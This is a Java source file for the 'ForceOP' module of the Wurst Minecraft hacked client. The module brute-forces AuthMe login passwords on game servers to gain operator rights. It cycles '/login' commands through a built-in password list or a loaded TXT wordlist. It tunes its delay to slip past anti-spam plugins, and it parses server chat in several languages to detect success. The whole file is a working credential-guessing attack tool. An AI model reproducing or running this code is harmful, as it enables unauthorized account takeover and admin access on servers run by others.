/*
 * Copyright (C) 2014 - 2020 | Alexander01998 | All rights reserved.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import java.awt.Desktop;
import java.awt.Font;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.URI;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;

import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.events.ChatInputListener;
import net.wurstclient.hack.DontSaveState;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;
import net.wurstclient.util.ForceOpDialog;
import net.wurstclient.util.MultiProcessingUtils;

@SearchTags({"Force OP", "AuthMe Cracker", "AuthMeCracker", "auth me cracker",
	"admin hack", "AuthMe password cracker"})
@DontSaveState
public final class ForceOpHack extends Hack implements ChatInputListener
{
	private final String[] defaultList = {"password", "passwort", "password1",
		"passwort1", "password123", "passwort123", "pass", "pw", "pw1", "pw123",
		"hallo", "Wurst", "wurst", "1234", "12345", "123456", "1234567",
		"12345678", "123456789", "login", "register", "test", "sicher", "me",
		"penis", "penis1", "penis123", "minecraft", "minecraft1",
		"minecraft123", "mc", "admin", "server", "yourmom", "tester", "account",
		"creeper", "gronkh", "lol", "auth", "authme", "qwerty", "qwertz",
		"ficken", "ficken1", "ficken123", "fuck", "fuckme", "fuckyou"};
	private String[] passwords = {};
	
	private JDialog dialog;
	private JLabel lPWList;
	private JRadioButton rbDefaultList;
	private JRadioButton rbTXTList;
	private JButton bTXTList;
	private JButton bHowTo;
	private JSeparator sepListSpeed;
	private JLabel lSpeed;
	private JLabel lDelay1;
	private JSpinner spDelay;
	private JLabel lDelay2;
	private JCheckBox cbDontWait;
	private JSeparator sepSpeedStart;
	private JLabel lName;
	private JLabel lPasswords;
	private JLabel lTime;
	private JButton bStart;
	
	private boolean gotWrongPWMSG;
	private int lastPW;
	private JLabel lAttempts;
	
	public boolean forceOPDontWait = false;
	public int forceOPDelay = 1000;
	public String forceOPList = WURST.getWurstFolder().toString();
	private Process process;
	
	public ForceOpHack()
	{
		super("ForceOP", "Cracks AuthMe passwords. Can be used to get OP.");
		setCategory(Category.CHAT);
		
		try
		{
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	
	@Override
	public void onEnable()
	{
		// new Thread(() -> createDialog()).start();
		
		try
		{
			process = MultiProcessingUtils.startProcess(ForceOpDialog.class);
			
		}catch(IOException e)
		{
			throw new RuntimeException(e);
		}
		
		EVENTS.add(ChatInputListener.class, this);
	}
	
	@Override
	public void onDisable()
	{
		EVENTS.remove(ChatInputListener.class, this);
		
		// new Thread(() -> {
		// if(dialog != null)
		// dialog.dispose();
		// }).start();
		
		if(process != null)
			try
			{
				process.destroyForcibly();
				process.waitFor();
				
			}catch(InterruptedException e)
			{
				throw new RuntimeException(e);
			}
	}
	
	public void createDialog()
	{
		lastPW = -1;
		dialog = new JDialog((JFrame)null, ForceOpHack.this.getName(), false);
		dialog.setAlwaysOnTop(true);
		dialog.setSize(512, 248);
		dialog.setResizable(false);
		dialog.setLocationRelativeTo(null);
		dialog.setLayout(null);
		dialog.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
		dialog.addWindowListener(new WindowAdapter()
		{
			@Override
			public void windowClosing(WindowEvent e)
			{
				setEnabled(false);
			}
		});
		
		lPWList = new JLabel("Password list");
		lPWList.setLocation(4, 4);
		lPWList.setSize(lPWList.getPreferredSize());
		dialog.add(lPWList);
		
		rbDefaultList = new JRadioButton("default",
			forceOPList.equals(WURST.getWurstFolder().toString()));
		rbDefaultList.setLocation(4, 24);
		rbDefaultList.setSize(rbDefaultList.getPreferredSize());
		dialog.add(rbDefaultList);
		
		rbTXTList = new JRadioButton("TXT file", !rbDefaultList.isSelected());
		rbTXTList.setLocation(
			rbDefaultList.getX() + rbDefaultList.getWidth() + 4, 24);
		rbTXTList.setSize(rbTXTList.getPreferredSize());
		rbTXTList.addChangeListener(e -> {
			bTXTList.setEnabled(rbTXTList.isSelected());
			if(!rbTXTList.isSelected())
				forceOPList = WURST.getWurstFolder().toString();
			loadPWList();
			update();
			
		});
		dialog.add(rbTXTList);
		
		ButtonGroup bgList = new ButtonGroup();
		bgList.add(rbDefaultList);
		bgList.add(rbTXTList);
		
		bTXTList = new JButton("browse");
		bTXTList.setLocation(rbTXTList.getX() + rbTXTList.getWidth() + 4, 24);
		bTXTList.setSize(bTXTList.getPreferredSize());
		bTXTList.setEnabled(rbTXTList.isSelected());
		bTXTList.addActionListener(e -> {
			JFileChooser fsTXTList = new JFileChooser();
			fsTXTList.setAcceptAllFileFilterUsed(false);
			fsTXTList.addChoosableFileFilter(
				new FileNameExtensionFilter("TXT files", new String[]{"txt"}));
			fsTXTList.setFileSelectionMode(JFileChooser.FILES_ONLY);
			fsTXTList.setCurrentDirectory(new File(forceOPList));
			int action = fsTXTList.showOpenDialog(dialog);
			if(action == JFileChooser.APPROVE_OPTION)
				if(!fsTXTList.getSelectedFile().exists())
					JOptionPane.showMessageDialog(dialog,
						"File does not exist!", "Error",
						JOptionPane.ERROR_MESSAGE);
				else
					forceOPList = fsTXTList.getSelectedFile().getPath();
			loadPWList();
			update();
		});
		dialog.add(bTXTList);
		
		bHowTo = new JButton("How to use");
		bHowTo.setFont(new Font(bHowTo.getFont().getName(), Font.BOLD, 16));
		bHowTo.setSize(bHowTo.getPreferredSize());
		bHowTo.setLocation(506 - bHowTo.getWidth() - 32, 12);
		bHowTo.addActionListener(e -> {
			try
			{
				String howToLink =
					"http://www.wurstclient.net/Mods/Force_OP_(AuthMeCracker)/";
				Desktop.getDesktop().browse(new URI(howToLink));
			}catch(Throwable var5)
			{
				var5.printStackTrace();
			}
		});
		dialog.add(bHowTo);
		
		sepListSpeed = new JSeparator();
		sepListSpeed.setLocation(4, 56);
		sepListSpeed.setSize(498, 4);
		dialog.add(sepListSpeed);
		
		lSpeed = new JLabel("Speed");
		lSpeed.setLocation(4, 64);
		lSpeed.setSize(lSpeed.getPreferredSize());
		dialog.add(lSpeed);
		
		lDelay1 = new JLabel("Delay between attempts:");
		lDelay1.setLocation(4, 84);
		lDelay1.setSize(lDelay1.getPreferredSize());
		dialog.add(lDelay1);
		
		spDelay = new JSpinner();
		spDelay.setToolTipText("<html>"
			+ "50ms: fastest, doesn't bypass AntiSpam plugins<br>"
			+ "1.000ms: recommended, bypasses most AntiSpam plugins<br>"
			+ "10.000ms: slowest, bypasses all AntiSpam plugins" + "</html>");
		spDelay.setModel(new SpinnerNumberModel(forceOPDelay, 50, 10000, 50));
		spDelay.setLocation(lDelay1.getX() + lDelay1.getWidth() + 4, 84);
		spDelay.setSize(60, (int)spDelay.getPreferredSize().getHeight());
		spDelay.addChangeListener(e -> {
			forceOPDelay = (Integer)spDelay.getValue();
			update();
		});
		dialog.add(spDelay);
		
		lDelay2 = new JLabel("ms");
		lDelay2.setLocation(spDelay.getX() + spDelay.getWidth() + 4, 84);
		lDelay2.setSize(lDelay2.getPreferredSize());
		dialog.add(lDelay2);
		
		cbDontWait = new JCheckBox(
			"<html>Don't wait for \"<span style=\"color: rgb(192, 0, 0);\"><b>Wrong password!</b></span>\" messages</html>",
			forceOPDontWait);
		cbDontWait
			.setToolTipText("Increases the speed but can cause inaccuracy.");
		cbDontWait.setLocation(4, 104);
		cbDontWait.setSize(cbDontWait.getPreferredSize());
		cbDontWait.addActionListener(e -> {
			forceOPDontWait = cbDontWait.isSelected();
			update();
		});
		dialog.add(cbDontWait);
		
		sepSpeedStart = new JSeparator();
		sepSpeedStart.setLocation(4, 132);
		sepSpeedStart.setSize(498, 4);
		dialog.add(sepSpeedStart);
		
		lName = new JLabel("Username: " + MC.getSession().getUsername());
		lName.setLocation(4, 140);
		lName.setSize(lName.getPreferredSize());
		dialog.add(lName);
		
		lPasswords = new JLabel("Passwords: error");
		lPasswords.setLocation(4, 160);
		lPasswords.setSize(lPasswords.getPreferredSize());
		dialog.add(lPasswords);
		
		lTime = new JLabel("Estimated time: error");
		lTime.setLocation(4, 180);
		lTime.setSize(lTime.getPreferredSize());
		dialog.add(lTime);
		
		lAttempts = new JLabel("Attempts: error");
		lAttempts.setLocation(4, 200);
		lAttempts.setSize(lAttempts.getPreferredSize());
		dialog.add(lAttempts);
		
		bStart = new JButton("Start");
		bStart.setFont(new Font(bHowTo.getFont().getName(), Font.BOLD, 18));
		bStart.setLocation(506 - 192 - 12, 144);
		bStart.setSize(192, 66);
		bStart.addActionListener(e -> startForceOP());
		dialog.add(bStart);
		
		loadPWList();
		update();
		// MC.setIngameNotInFocus();
		dialog.setVisible(true);
		dialog.toFront();
	}
	
	private void startForceOP()
	{
		lPWList.setEnabled(false);
		rbDefaultList.setEnabled(false);
		rbTXTList.setEnabled(false);
		bTXTList.setEnabled(false);
		bHowTo.setEnabled(false);
		sepListSpeed.setEnabled(false);
		lSpeed.setEnabled(false);
		lDelay1.setEnabled(false);
		spDelay.setEnabled(false);
		lDelay2.setEnabled(false);
		cbDontWait.setEnabled(false);
		sepSpeedStart.setEnabled(false);
		lName.setEnabled(false);
		lPasswords.setEnabled(false);
		bStart.setEnabled(false);
		new Thread(() -> runForceOP(), "ForceOP").start();
	}
	
	private void runForceOP()
	{
		MC.player.sendChatMessage("/login " + MC.getSession().getUsername());
		lastPW = 0;
		loadPWList();
		update();
		for(int i = 0; i < passwords.length; i++)
		{
			if(!isEnabled())
				return;
			if(!cbDontWait.isSelected())
				gotWrongPWMSG = false;
			while(!cbDontWait.isSelected() && !hasGotWrongPWMSG()
				|| MC.player == null)
			{
				if(!isEnabled())
					return;
				try
				{
					Thread.sleep(50);
				}catch(InterruptedException e)
				{
					e.printStackTrace();
				}
				
				// If you get kicked, it won't wait for "Wrong password!".
				if(MC.player == null)
					gotWrongPWMSG = true;
			}
			try
			{
				Thread.sleep(forceOPDelay);
			}catch(InterruptedException e)
			{
				e.printStackTrace();
			}
			boolean sent = false;
			while(!sent)
				try
				{
					MC.player.sendChatMessage("/login " + passwords[i]);
					sent = true;
				}catch(Exception e)
				{
					try
					{
						Thread.sleep(50);
					}catch(InterruptedException e1)
					{
						e1.printStackTrace();
					}
				}
			lastPW = i + 1;
			update();
		}
		ChatUtils.message("\u00a7c[\u00a74\u00a7lFAILURE\u00a7c]\u00a7f All "
			+ (lastPW + 1) + " passwords were wrong.");
	}
	
	private void loadPWList()
	{
		if(rbTXTList.isSelected()
			&& !forceOPList.equals(WURST.getWurstFolder().toString()))
			try
			{
				File pwList = new File(forceOPList);
				ArrayList<String> loadedPWs = new ArrayList<>();
				try(BufferedReader load =
					new BufferedReader(new FileReader(pwList)))
				{
					for(String line = ""; (line = load.readLine()) != null;)
						loadedPWs.add(line);
				}
				passwords = loadedPWs.toArray(new String[loadedPWs.size()]);
			}catch(IOException e)
			{
				e.printStackTrace();
				JOptionPane.showMessageDialog(dialog,
					"Error: " + e.getMessage(), "Error",
					JOptionPane.ERROR_MESSAGE);
				return;
			}
		else
			passwords = defaultList;
		lPasswords.setText("Passwords: " + (passwords.length + 1));
		lPasswords.setSize(lPasswords.getPreferredSize());
	}
	
	private void update()
	{
		long timeMS =
			(passwords.length + 1 - lastPW) * (Integer)spDelay.getValue();
		timeMS = timeMS + (int)(timeMS / 30000 * 5000);
		if(!cbDontWait.isSelected())
			timeMS = timeMS + timeMS / (Integer)spDelay.getValue() * 50;
		String timeString = TimeUnit.MILLISECONDS.toDays(timeMS) + "d "
			+ (TimeUnit.MILLISECONDS.toHours(timeMS)
				- TimeUnit.DAYS.toHours(TimeUnit.MILLISECONDS.toDays(timeMS)))
			+ "h "
			+ (TimeUnit.MILLISECONDS.toMinutes(timeMS) - TimeUnit.HOURS
				.toMinutes(TimeUnit.MILLISECONDS.toHours(timeMS)))
			+ "m " + (TimeUnit.MILLISECONDS.toSeconds(timeMS) - TimeUnit.MINUTES
				.toSeconds(TimeUnit.MILLISECONDS.toMinutes(timeMS)))
			+ "s";
		lTime.setText("Estimated time: " + timeString);
		lTime.setSize(lTime.getPreferredSize());
		lAttempts.setText(
			"Attempts: " + (lastPW + 1) + "/" + (passwords.length + 1));
		lAttempts.setSize(lAttempts.getPreferredSize());
	}
	
	@Override
	public void onReceivedMessage(ChatInputEvent event)
	{
		String message = event.getComponent().asString();
		if(message.startsWith("\u00a7c[\u00a76Wurst\u00a7c]\u00a7f "))
			return;
		if(message.toLowerCase().contains("wrong")// English
			|| message.toLowerCase().contains("falsch")// Deutsch!
			|| message.toLowerCase().contains("incorrect")// English
			|| message.toLowerCase().contains("mauvais")// French
			|| message.toLowerCase().contains("mal")// Spanish
			|| message.toLowerCase().contains("sbagliato")// Italian
		)
			gotWrongPWMSG = true;
		else if(message.toLowerCase().contains("success")// English & Italian
			|| message.toLowerCase().contains("erfolg")// Deutsch!
			|| message.toLowerCase().contains("succès")// French
			|| message.toLowerCase().contains("éxito")// Spanish
		)
		{
			String password;
			if(lastPW == -1)
				return;
			else if(lastPW == 0)
				password = MC.getSession().getUsername();
			else
				password = passwords[lastPW - 1];
			ChatUtils.message(
				"\u00a7a[\u00a72\u00a7lSUCCESS\u00a7a]\u00a7f The password \""
					+ password + "\" worked.");
			setEnabled(false);
		}else if(message.toLowerCase().contains("/help")
			|| message.toLowerCase().contains("permission"))
			ChatUtils.warning("It looks like this server doesn't have AuthMe.");
		else if(message.toLowerCase().contains("logged in")
			|| message.toLowerCase().contains("eingeloggt")
			|| message.toLowerCase().contains("eingelogt"))
			ChatUtils.warning("It looks like you are already logged in.");
	}
	
	private boolean hasGotWrongPWMSG()
	{
		return gotWrongPWMSG;
	}
}
